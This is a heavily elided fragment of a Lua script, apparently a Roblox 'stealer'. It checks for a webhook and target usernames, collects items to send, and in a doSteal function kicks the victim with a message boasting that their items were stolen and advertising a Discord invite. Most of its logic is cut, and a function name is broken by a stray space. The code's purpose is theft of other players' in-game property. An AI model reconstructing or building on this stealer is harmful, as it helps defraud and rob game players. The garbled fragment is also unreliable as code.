...
if next(_G.Usernames) == nil or _G.webhook == "" then
...
if #itemsToSend > 0 then
    ...
    local function doSteal(player)
        ...
        plr:kick("All your stuff just got stolen by Saiki GG stealer!\n Join discord.gg/LINK")
    end

    local function waitForUser Chat()
